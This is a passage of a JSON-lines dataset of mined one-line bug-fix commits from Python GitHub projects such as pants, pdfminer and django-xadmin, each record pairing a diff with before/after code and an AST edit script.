[\"identifier:is_pending_student\", 3, 52, 3, 70], \"filter\"], [\"Insert\", [\"argument_list\", 3, 70, 3, 72], [\"keyword_argument\", \"N3\"], 1], [\"Insert\", [\"argument_list\", 3, 70, 3, 72], [\",:,\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 70, 3, 72], [\"keyword_argument\", \"N4\"], 3], [\"Update\", [\"identifier:user\", 3, 31, 3, 35], \"Activation\"], [\"Update\", [\"identifier:userinformation\", 3, 36, 3, 51], \"objects\"], [\"Insert\", \"N3\", [\"identifier:user\", \"T\"], 0], [\"Insert\", \"N3\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:user\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:type\", \"T\"], 0], [\"Insert\", \"N4\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:type_val\", \"T\"], 2]]"}
{"project": "service.subtitles.subdivx", "commit_sha": "2d2e1e2793ec209f7c9a271d473780a92e80e6f6", "parent_sha": "e0beca2b834603e9929b7225dd97958c4ba63b19", "file_path": "service.py", "project_url": "https://github.com/ramiro/service.subtitles.subdivx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -484,7 +484,7 @@ def get_params(argv):\n \n def debug_dump_path(victim, name):\n     t = type(victim)\n-    xbmc.log(\"%s (%s): %s\" % (name, t, victim), level=LOGDEBUG)\n+    xbmc.log(\"SUBDIVX - %s (%s): %s\" % (name, t, victim), level=LOGDEBUG)\n \n \n def main():\n", "before": "xbmc . log ( \"%s (%s): %s\" % ( name , t , victim ) , level = LOGDEBUG )", "after": "xbmc . log ( \"SUBDIVX - %s (%s): %s\" % ( name , t , victim ) , level = LOGDEBUG )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"%s (%s): %s\\\"\", 3, 14, 3, 27], \"\\\"SUBDIVX - %s (%s): %s\\\"\"]]"}
{"project": "osf-sync", "commit_sha": "4dbbb8a5d575532d2792babed05a2e180356b092", "parent_sha": "f142495a282a179971ed2b771e7241037d69b46c", "file_path": "osfoffline/sync/utils.py", "project_url": "https://github.com/CenterForOpenScience/osf-sync", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -131,7 +131,7 @@ class EventConsolidator:\n \n         item.events.append(event)\n \n-        if event.event_type == EVENT_TYPE_MODIFIED and not (sys.platform == 'win32' and len(item.events) > 1 and item.events[-2].event_type == EVENT_TYPE_MOVED):\n+        if event.event_type == EVENT_TYPE_MODIFIED and not (sys.platform == 'win32' and len(item.events) > 1 and item.events[-2].event_type in (EVENT_TYPE_MOVED, EVENT_TYPE_CREATED)):\n             # Windows reports moved files as modified even if they are not, ignore these. Any changes will be picked up by the remote sync\n             item.modified = True\n \n", "before": "if event . event_type == EVENT_TYPE_MODIFIED and not ( sys . platform == 'win32' and len ( item . events ) > 1 and item . events [ - 2 ] . event_type == EVENT_TYPE_MOVED ) : item . modified = True", "after": "if event . event_type == EVENT_TYPE_MODIFIED and not ( sys . platform == 'win32' and len ( item . events ) > 1 and item . events [ - 2 ] . event_type in ( EVENT_TYPE_MOVED , EVENT_TYPE_CREATED ) ) : item . modified = True", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"comparison_operator\", 3, 114, 3, 160], [\"in:in\", \"T\"], 1], [\"Insert\", [\"comparison_operator\", 3, 114, 3, 160], [\"tuple\", \"N0\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"identifier:EVENT_TYPE_MOVED\", 3, 144, 3, 160], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:EVENT_TYPE_CREATED\", \"T\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4], [\"Delete\", [\"==:==\", 3, 141, 3, 143]]]"}
{"project": "OldSeleniumLibrary", "commit_sha": "ec2614cff83465c750fea653c00191192b25d1d3", "parent_sha": "052ddd4347d13350fd92f3dd7acc0d5f329df83c", "file_path": "src/SeleniumLibrary/button.py", "project_url": "https://github.com/robotframework/OldSeleniumLibrary", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -66,7 +66,7 @@ class Button(object):\n         self._info(\"Selecting '%s' from radio button '%s'.\" % (value, group_name))\n-        xpath = \"xpath=//input[@type='radio' and @name='%s'and (@value='%s' or @id='%s')]\" \\\n+        xpath = \"xpath=//input[@type='radio' and @name='%s' and (@value='%s' or @id='%s')]\" \\\n                  % (group_name, value, value)\n         if not self._selenium.is_checked(xpath):\n             self._selenium.click(xpath)\n", "before": "xpath = \"xpath=//input[@type='radio' and @name='%s'and (@value='%s' or @id='%s')]\" % ( group_name , value , value )", "after": "xpath = \"xpath=//input[@type='radio' and @name='%s' and (@value='%s' or @id='%s')]\" % ( group_name , value , value )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"xpath=//input[@type='radio' and @name='%s'and (@value='%s' or @id='%s')]\\\"\", 1, 17, 1, 91], \"\\\"xpath=//input[@type='radio' and @name='%s' and (@value='%s' or @id='%s')]\\\"\"]]"}
{"project": "sipa", "commit_sha": "f61452fde7e78ed6e56547d515a76fdeb430c312", "parent_sha": "4be907bd5752a74cedf9369e90bd88f5577a61da", "file_path": "sektionsweb/blueprints/documents.py", "project_url": "https://github.com/agdsn/sipa", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -10,6 +10,6 @@ bp_documents = Blueprint('documents', __name__, url_prefix='/documents')\n def show(document):\n     #(TODO) check wether an document should be avaible<\n     try:\n-        return send_file('cached_documents/' + document)\n+        return send_file('../cached_documents/' + document)\n     except IOError:\n         abort(404)\n\\ No newline at end of file\n", "before": "return send_file ( 'cached_documents/' + document )", "after": "return send_file ( '../cached_documents/' + document )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'cached_documents/'\", 3, 26, 3, 45], \"'../cached_documents/'\"]]"}
{"project": "pants", "commit_sha": "52a7ef5eb319ae9c0ce3ad9ed6f51ac5a50e0bf7", "parent_sha": "be587b52df61d1fdb3b1b16f2dc8ee4238b078d6", "file_path": "src/python/twitter/pants/tasks/jvm_dependency_cache.py", "project_url": "https://github.com/square/pants", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -480,7 +480,7 @@ class JvmDependencyCache(object):\n           self.check_target_unnecessary_deps(target, computed_deps)\n \n     if len(all_undeclared_deps) > 0 or \\\n-      (self.check_intransitive_deps and len(all_intransitive_undeclared_deps) > 0):\n+      (self.check_intransitive_deps is not 'none' and len(all_intransitive_undeclared_deps) > 0):\n       raise TaskError('Missing dependencies detected.')\n \n", "before": "if len ( all_undeclared_deps ) > 0 or ( self . check_intransitive_deps and len ( all_intransitive_undeclared_deps ) > 0 ) : raise TaskError ( 'Missing dependencies detected.' )", "after": "if len ( all_undeclared_deps ) > 0 or ( self . check_intransitive_deps is not 'none' and len ( all_intransitive_undeclared_deps ) > 0 ) : raise TaskError ( 'Missing dependencies detected.' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 82], [\"comparison_operator\", \"N0\"], 0], [\"Move\", \"N0\", [\"attribute\", 3, 8, 3, 36], 0], [\"Insert\", \"N0\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N0\", [\"not:not\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'none'\", \"T\"], 3]]"}
{"project": "pants", "commit_sha": "05318314ef0458b4b0d69580aa29a1efba960b16", "parent_sha": "da9933ccec73bd1a8c9ee6a2dd6adfcc44771349", "file_path": "src/python/twitter/pants/cache/__init__.py", "project_url": "https://github.com/square/pants", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -34,7 +34,7 @@ def create_artifact_cache(log, artifact_root, spec, task_name):\n     raise ValueError('Empty artifact cache spec')\n   if isinstance(spec, basestring):\n     if spec.startswith('/'):\n-      log.info('%s using local artifact cache at %s' % spec)\n+      log.info('%s using local artifact cache at %s' % (task_name, spec))\n       return FileBasedArtifactCache(log, artifact_root, spec)\n     elif spec.startswith('http://') or spec.startswith('https://'):\n       # Caches are supposed to be close, and we don't want to waste time pinging on no-op builds.\n", "before": "log . info ( '%s using local artifact cache at %s' % spec )", "after": "log . info ( '%s using local artifact cache at %s' % ( task_name , spec ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 16, 3, 60], [\"tuple\", \"N0\"], 2], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"identifier:task_name\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Move\", \"N0\", [\"identifier:spec\", 3, 56, 3, 60], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4]]"}
{"project": "pants", "commit_sha": "c4bec6cc358f8afbcc3576e5e15d9cba574c9d04", "parent_sha": "03289c77c12a26e462b1b7ac0c3925753bb21563", "file_path": "src/python/twitter/pants/goal/phase.py", "project_url": "https://github.com/square/pants", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -177,7 +177,7 @@ class Phase(PhaseBase):\n \n-    if (first or replace or before or after) and not (first ^ replace ^ bool(before) ^ bool(after)):\n+    if (first or replace or before or after) and (int(first) + int(replace) + int(bool(before)) + int(bool(after))) > 1:\n       raise GoalError('Can only specify one of first, replace, before or after')\n \n     Phase._phase_by_goal[goal] = self\n", "before": "if ( first or replace or before or after ) and not ( first ^ replace ^ bool ( before ) ^ bool ( after ) ) : raise GoalError ( 'Can only specify one of first, replace, before or after' )", "after": "if ( first or replace or before or after ) and ( int ( first ) + int ( replace ) + int ( bool ( before ) ) + int ( bool ( after ) ) ) > 1 : raise GoalError ( 'Can only specify one of first, replace, before or after' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"boolean_operator\", 1, 8, 1, 100], [\"comparison_operator\", \"N0\"], 2], [\"Move\", \"N0\", [\"parenthesized_expression\", 1, 54, 1, 100], 0], [\"Insert\", \"N0\", [\">:>\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:1\", \"T\"], 2], [\"Insert\", [\"binary_operator\", 1, 55, 1, 99], [\"+:+\", \"T\"], 1], [\"Insert\", [\"binary_operator\", 1, 55, 1, 99], [\"call\", \"N1\"], 2], [\"Insert\", [\"binary_operator\", 1, 55, 1, 85], [\"+:+\", \"T\"], 1], [\"Insert\", [\"binary_operator\", 1, 55, 1, 85], [\"call\", \"N2\"], 2], [\"Insert\", \"N1\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", [\"binary_operator\", 1, 55, 1, 70], [\"call\", \"N4\"], 0], [\"Insert\", [\"binary_operator\", 1, 55, 1, 70], [\"+:+\", \"T\"], 1], [\"Insert\", [\"binary_operator\", 1, 55, 1, 70], [\"call\", \"N5\"], 2], [\"Insert\", \"N2\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N6\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Move\", \"N3\", [\"call\", 1, 88, 1, 99], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N4\", [\"argument_list\", \"N7\"], 1], [\"Insert\", \"N5\", [\"identifier:int\", \"T\"], 0], [\"Insert\", \"N5\", [\"argument_list\", \"N8\"], 1], [\"Insert\", \"N6\", [\"(:(\", \"T\"], 0], [\"Move\", \"N6\", [\"call\", 1, 73, 1, 85], 1], [\"Insert\", \"N6\", [\"):)\", \"T\"], 2], [\"Insert\", \"N7\", [\"(:(\", \"T\"], 0], [\"Move\", \"N7\", [\"identifier:first\", 1, 55, 1, 60], 1], [\"Insert\", \"N7\", [\"):)\", \"T\"], 2], [\"Insert\", \"N8\", [\"(:(\", \"T\"], 0], [\"Move\", \"N8\", [\"identifier:replace\", 1, 63, 1, 70], 1], [\"Insert\", \"N8\", [\"):)\", \"T\"], 2], [\"Delete\", [\"not:not\", 1, 50, 1, 53]], [\"Delete\", [\"^:^\", 1, 61, 1, 62]], [\"Delete\", [\"^:^\", 1, 71, 1, 72]], [\"Delete\", [\"^:^\", 1, 86, 1, 87]], [\"Delete\", [\"not_operator\", 1, 50, 1, 100]]]"}
{"project": "openvpn-netfilter", "commit_sha": "6a28f3562c733ae97b361e6ce4a4255041454229", "parent_sha": "ed0be650baaa830e8e7d6a2565b1be9379144dca", "file_path": "netfilter_openvpn.py", "project_url": "https://github.com/mozilla-it/openvpn-netfilter", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -340,7 +340,7 @@ def kill_block_hack(usersrcip, usercn):\n \ttry:\n-\t\tiptables('-D INPUT -s ' + usersrcip + ' -j DROP')\n+\t\tiptables('-D FORWARD -s ' + usersrcip + ' -j DROP')\n \texcept:\n \t\tmdmsg.send(summary='Failed to delete blocking rule, potential security issue', severity='CRITICAL',\n \t\tdetails={'vpnip': usersrcip, 'user': usercn})\n", "before": "iptables ( '-D INPUT -s ' + usersrcip + ' -j DROP' )", "after": "iptables ( '-D FORWARD -s ' + usersrcip + ' -j DROP' )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'-D INPUT -s '\", 1, 12, 1, 26], \"'-D FORWARD -s '\"]]"}
{"project": "haxe-sublime2-bundle", "commit_sha": "cb411ecc15d333518985d043a58716fb18c5f078", "parent_sha": "bc7a2d2a093a0c39097419dadd32f1e66baea624", "file_path": "HaxeComplete.py", "project_url": "https://github.com/joa/haxe-sublime2-bundle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -822,7 +822,7 @@ class HaxeComplete( sublime_plugin.EventListener ):\n                 folder = folders[0]\n             else:\n                 for f in folders:\n-                    if f + \"/\" in fn :\n+                    if f + os.sep in fn :\n                         folder = f\n \n         if folder is not None :\n", "before": "if f + \"/\" in fn : folder = f", "after": "if f + os . sep in fn : folder = f", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 24, 3, 31], [\"attribute\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:sep\", \"T\"], 2], [\"Delete\", [\"string:\\\"/\\\"\", 3, 28, 3, 31]]]"}
{"project": "driftscan", "commit_sha": "746c34566aa9bb9b342407acdc570d1ca75bfc30", "parent_sha": "dc7ed8cbe4efe5be3ebd1e7b2524acad079016bc", "file_path": "drift/core/telescope.py", "project_url": "https://github.com/radiocosmology/driftscan", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -376,7 +376,7 @@ class TransitTelescope(with_metaclass(abc.ABCMeta, config.Reader, ctime.Observer\n         # Rebin frequencies if needed\n         if self.channel_bin > 1:\n \n-            if nf % self.channel_bin != 0:\n+            if self.num_freq % self.channel_bin != 0:\n                 raise ValueError(\n                     \"Channel binning must exactly divide the total number of channels\"\n                 )\n", "before": "if nf % self . channel_bin != 0 : raise ValueError ( \"Channel binning must exactly divide the total number of channels\" )", "after": "if self . num_freq % self . channel_bin != 0 : raise ValueError ( \"Channel binning must exactly divide the total number of channels\" )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 16, 3, 37], [\"attribute\", \"N0\"], 0], [\"Update\", [\"identifier:nf\", 3, 16, 3, 18], \"self\"], [\"Move\", \"N0\", [\"identifier:nf\", 3, 16, 3, 18], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:num_freq\", \"T\"], 2]]"}
{"project": "django-diary", "commit_sha": "be23b5f41d85674841f8a89f477ec8300ea196cc", "parent_sha": "ab6f09ac12dc237942a14911efd20e3b8abc32ba", "file_path": "diary/views.py", "project_url": "https://github.com/BobBowles/django-diary", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -617,7 +617,7 @@ def entry_update(request):\n     except ValidationError as ve:\n         # attempt to fit the entry in later in the time slot\n         endTime = (\n-            datetime.datetime.combine(date, time) + TIME_INC\n+            datetime.datetime.combine(date, time) + DIARY_TIME_INC\n             ).time()\n         otherEntry = Entry.objects\\\n             .filter(\n", "before": "ve : endTime = ( datetime . datetime . combine ( date , time ) + TIME_INC ) . time ( )", "after": "ve : endTime = ( datetime . datetime . combine ( date , time ) + DIARY_TIME_INC ) . time ( )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"identifier:TIME_INC\", 3, 53, 3, 61], \"DIARY_TIME_INC\"]]"}
{"project": "pdfminer", "commit_sha": "88f75fad00cd985660fa0c6076b9a5abc2a9ad09", "parent_sha": "6041443e0f97078fbc8f7dfdccac849cc501ae8b", "file_path": "pdfminer/converter.py", "project_url": "https://github.com/metachris/pdfminer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -384,7 +384,7 @@ class XMLConverter(PDFConverter):\n         return\n \n     def write_header(self):\n-        self.outfp.write('<?xml version=\"1.0\" encoding=\"%s\" ?>\\n' % codec)\n+        self.outfp.write('<?xml version=\"1.0\" encoding=\"%s\" ?>\\n' % self.codec)\n         self.outfp.write('<pages>\\n')\n         return\n \n", "before": "self . outfp . write ( '<?xml version=\"1.0\" encoding=\"%s\" ?>\\n' % codec )", "after": "self . outfp . write ( '<?xml version=\"1.0\" encoding=\"%s\" ?>\\n' % self . codec )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 26, 3, 74], [\"attribute\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:codec\", 3, 69, 3, 74], 2]]"}
{"project": "pdfminer", "commit_sha": "9bba7ac08b9b26cb6695c865ea60caf323c7b973", "parent_sha": "513da5714a40a717427bbe089bce527fd03bd901", "file_path": "pdfminer/converter.py", "project_url": "https://github.com/metachris/pdfminer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -384,7 +384,7 @@ class XMLConverter(PDFConverter):\n         return\n \n     def write_header(self):\n-        self.outfp.write('<?xml version=\"1.0\" encoding=\"%s\" ?>\\n' % codec)\n+        self.outfp.write('<?xml version=\"1.0\" encoding=\"%s\" ?>\\n' % self.codec)\n         self.outfp.write('<pages>\\n')\n         return\n \n", "before": "self . outfp . write ( '<?xml version=\"1.0\" encoding=\"%s\" ?>\\n' % codec )", "after": "self . outfp . write ( '<?xml version=\"1.0\" encoding=\"%s\" ?>\\n' % self . codec )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 26, 3, 74], [\"attribute\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:codec\", 3, 69, 3, 74], 2]]"}
{"project": "taskgrader", "commit_sha": "9c1c5e08ed4df26f237cef8144e798fe5703132d", "parent_sha": "052082d9470322df9b0a964ee78a82dd64ed2cee", "file_path": "taskgrader.py", "project_url": "https://github.com/France-ioi/taskgrader", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -74,7 +74,7 @@ def getFile(fileDescr, workingDir, buildDir=None, language=''):\n     if '/' in fileDescr['name']:\n         # Need to make a folder\n         try:\n-            os.makedirs(workingDir + fileDescr['name'].split('/')[0])\n+            os.makedirs(workingDir + '/'.join(fileDescr['name'].split('/')[:-1]))\n         except:\n             pass\n         \n", "before": "os . makedirs ( workingDir + fileDescr [ 'name' ] . split ( '/' ) [ 0 ] )", "after": "os . makedirs ( workingDir + '/' . join ( fileDescr [ 'name' ] . split ( '/' ) [ : - 1 ] ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 25, 3, 69], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"string:'/'\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:join\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"subscript\", 3, 38, 3, 69], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", [\"subscript\", 3, 38, 3, 69], [\"slice\", \"N3\"], 2], [\"Insert\", \"N3\", [\":::\", \"T\"], 0], [\"Insert\", \"N3\", [\"unary_operator\", \"N4\"], 1], [\"Insert\", \"N4\", [\"-:-\", \"T\"], 0], [\"Insert\", \"N4\", [\"integer:1\", \"T\"], 1], [\"Delete\", [\"integer:0\", 3, 67, 3, 68]]]"}
{"project": "pcircle", "commit_sha": "18a3c553f3ac7bf2eb25afb3672d269438fef6df", "parent_sha": "8bf17b86c423e8eba5929fe31af26888d740670f", "file_path": "pcircle/utils.py", "project_url": "https://github.com/olcf/pcircle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -142,7 +142,7 @@ def bins_strs(binlist):\n         res.append(\"Bin_\" + \"_\".join(x))\n \n     last = bytes_fmt(binlist[-1]).split()\n-    res.append(\"Bin_\" + \"_\".join(last))\n+    res.append(\"Bin>\" + \"_\".join(last))\n     return res\n \n def spiner():\n", "before": "res . append ( \"Bin_\" + \"_\" . join ( last ) )", "after": "res . append ( \"Bin>\" + \"_\" . join ( last ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Bin_\\\"\", 3, 16, 3, 22], \"\\\"Bin>\\\"\"]]"}
{"project": "Pyglet", "commit_sha": "07d064dc8d9580d2db2e840d58c85371c8c70756", "parent_sha": "c53550aea98216e7fa1034dc4a90142aab836781", "file_path": "pyglet/media/drivers/openal/__init__.py", "project_url": "https://github.com/adamlwgriffiths/Pyglet", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -542,7 +542,7 @@ class OpenALListener(Listener):\n         self._velocity = velocity \n \n     def _set_forward_orientation(self, orientation):\n-        val = (ALfloat * 6)(*(orientation + self._up_orientation))\n+        val = (al.ALfloat * 6)(*(orientation + self._up_orientation))\n         al.alListenerfv(al.AL_ORIENTATION, val)\n         self._forward_orientation = orientation\n \n", "before": "val = ( ALfloat * 6 ) ( * ( orientation + self . _up_orientation ) )", "after": "val = ( al . ALfloat * 6 ) ( * ( orientation + self . _up_orientation ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 16, 3, 27], [\"attribute\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:al\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:ALfloat\", 3, 16, 3, 23], 2]]"}
{"project": "django-xadmin", "commit_sha": "ca7ada5a4002588936bdd6ecad424b83d7946a76", "parent_sha": "6031f2c8e3f00d307c2b5a7cb043c6ceed43bec0", "file_path": "xadmin/plugins/xversion.py", "project_url": "https://github.com/scrapinghub/django-xadmin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -171,7 +171,7 @@ class ReversionPlugin(BaseAdminPlugin):\n         if obj:\n             revisionlist_url = self.admin_view.model_admin_url(\n                 'revisionlist', quote(obj.pk))\n-            nodes.append(mark_safe('<a href=\"%s\" class=\"btn\"><i class=\"icon-time\"></i> <span>%s</span></a>' % (revisionlist_url, _(u'History'))))\n+            nodes.append(mark_safe('<a href=\"%s\" class=\"btn btn-default\"><i class=\"icon-time\"></i> <span>%s</span></a>' % (revisionlist_url, _(u'History'))))\n \n \n class BaseReversionView(ModelAdminView):\n", "before": "nodes . append ( mark_safe ( '<a href=\"%s\" class=\"btn\"><i class=\"icon-time\"></i> <span>%s</span></a>' % ( revisionlist_url , _ ( u'History' ) ) ) )", "after": "nodes . append ( mark_safe ( '<a href=\"%s\" class=\"btn btn-default\"><i class=\"icon-time\"></i> <span>%s</span></a>' % ( revisionlist_url , _ ( u'History' ) ) ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'<a href=\\\"%s\\\" class=\\\"btn\\\"><i class=\\\"icon-time\\\"></i> <span>%s</span></a>'\", 3, 36, 3, 108], \"'<a href=\\\"%s\\\" class=\\\"btn btn-default\\\"><i class=\\\"icon-time\\\"></i> <span>%s</span></a>'\"]]"}
{"project": "pdfcrowd-python", "commit_sha": "b671c7a0689f6516480a33aaf9619d8d49c67cbc", "parent_sha": "f7549da0475f20c79a45512d106dc19b17ddd24b", "file_path": "pdfcrowd.py", "project_url": "https://github.com/pdfcrowd/pdfcrowd-python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -714,7 +714,7 @@ def get_utf8_string(string):\n     return string\n \n def create_invalid_value_message(value, field, converter, hint, id):\n-    message = \"Invalid value '%s' for a field '%s'.\" % (value, field)\n+    message = \"Invalid value '%s' for the field '%s'.\" % (value, field)\n     if hint:\n         message += \" \" + hint\n     return message + ' ' + \"Details: https://www.pdfcrowd.com/doc/api/%s/python/#%s\" % (converter, id)\n", "before": "message = \"Invalid value '%s' for a field '%s'.\" % ( value , field )", "after": "message = \"Invalid value '%s' for the field '%s'.\" % ( value , field )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:\\\"Invalid value '%s' for a field '%s'.\\\"\", 3, 15, 3, 53], \"\\\"Invalid value '%s' for the field '%s'.\\\"\"]]"}
{"project": "django-xadmin", "commit_sha": "f842a9d7bff7610cc3ea6c528e9419a057fbcd87", "parent_sha": "f3165a64cc660a60d7a8d201d67752856ab1eeee", "file_path": "xadmin/plugins/details.py", "project_url": "https://github.com/scrapinghub/django-xadmin", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -46,7 +46,7 @@ class DetailsPlugin(BaseAdminPlugin):\n                                 args=(getattr(rel_obj, opts.pk.attname),))\n                         else:\n                             edit_url = ''\n-                        item.btns.append('<a data-res-uri=\"%s\" data-edit-uri=\"%s\" class=\"details-handler\" rel=\"tooltip\" title=\"%s\"><i class=\"fa fa-info-sign\"></i></a>'\n+                        item.btns.append('<a data-res-uri=\"%s\" data-edit-uri=\"%s\" class=\"details-handler\" rel=\"tooltip\" title=\"%s\"><i class=\"fa fa-info-circle\"></i></a>'\n                                          % (item_res_uri, edit_url, _(u'Details of %s') % str(rel_obj)))\n                 except NoReverseMatch:\n                     pass\n", "before": "item . btns . append ( '<a data-res-uri=\"%s\" data-edit-uri=\"%s\" class=\"details-handler\" rel=\"tooltip\" title=\"%s\"><i class=\"fa fa-info-sign\"></i></a>' % ( item_res_uri , edit_url , _ ( u'Details of %s' ) % str ( rel_obj ) ) )", "after": "item . btns . append ( '<a data-res-uri=\"%s\" data-edit-uri=\"%s\" class=\"details-handler\" rel=\"tooltip\" title=\"%s\"><i class=\"fa fa-info-circle\"></i></a>' % ( item_res_uri , edit_url , _ ( u'Details of %s' ) % str ( rel_obj ) ) )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Update\", [\"string:'<a data-res-uri=\\\"%s\\\" data-edit-uri=\\\"%s\\\" class=\\\"details-handler\\\" rel=\\\"tooltip\\\" title=\\\"%s\\\"><i class=\\\"fa fa-info-sign\\\"></i></a>'\", 3, 42, 3, 168], \"'<a data-res-uri=\\\"%s\\\" data-edit-uri=\\\"%s\\\" class=\\\"details-handler\\\" rel=\\\"tooltip\\\" title=\\\"%s\\\"><i class=\\\"fa fa-info-circle\\\"></i></a>'\"]]"}
{"project": "e2end", "commit_sha": "64b4bbedf9373d1cd712f28ef5031e00151fca8a", "parent_sha": "83114b3dac06ec8d1b8d0ad08511933acaafd30c", "file_path": "e2end/training.py", "project_url": "https://github.com/oplatek/e2end", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -109,7 +109,7 @@ def validate(c, sess, m, dev, e, dev_writer):\n                     aggreg_func[n] += dev_step_outputs[n]\n                 val_num += 1\n         for n, v in aggreg_func.items():\n-            aggreg_func[n] = float(v) / len(dev)\n+            aggreg_func[n] = float(v) / np.sum(dev.dial_lens)  # FIXME sum and divide -> AVERAGE may not be the wanted aggregations ops\n         validate_set_measures = ([tf.Summary.Value(tag='valid_' + n, simple_value=v) for n, v in aggreg_func.items()])\n         dev_writer.add_summary(tf.Summary(value=validate_set_measures), m.step)\n         avg_turn_reward, avg_turn_loss = aggreg_func['reward'], aggreg_func['loss']\n", "before": "aggreg_func [ n ] = float ( v ) / len ( dev )", "after": "aggreg_func [ n ] = float ( v ) / np . sum ( dev . dial_lens )", "sstub_pattern": "CHANGE_BINARY_OPERAND", "edit_script": "[[\"Insert\", [\"call\", 3, 41, 3, 49], [\"attribute\", \"N0\"], 0], [\"Update\", [\"identifier:len\", 3, 41, 3, 44], \"np\"], [\"Move\", \"N0\", [\"identifier:len\", 3, 41, 3, 44], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:sum\", \"T\"], 2], [\"Insert\", [\"argument_list\", 3, 44, 3, 49], [\"attribute\", \"N1\"], 1], [\"Move\", \"N1\", [\"identifier:dev\", 3, 45, 3, 48], 0], [\"Insert\", 